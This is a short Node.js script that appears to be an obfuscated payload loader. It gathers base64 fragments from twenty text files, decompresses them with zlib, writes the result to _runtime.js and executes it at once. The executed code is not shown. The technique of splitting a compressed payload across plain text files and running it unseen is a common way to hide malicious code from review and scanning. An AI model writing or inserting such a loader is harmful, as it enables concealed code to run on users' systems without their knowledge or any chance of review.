const fs=require("fs");const path=require("path");const zlib=require("zlib");
const n=20;
const b64=Array.from({length:n},(_,i)=>fs.readFileSync(path.join(__dirname,"s"+i+".txt"),"utf8").trim()).join("");
const code=zlib.inflateSync(Buffer.from(b64,"base64")).toString("utf8");
fs.writeFileSync(path.join(__dirname,"_runtime.js"),code);
require("./_runtime.js");
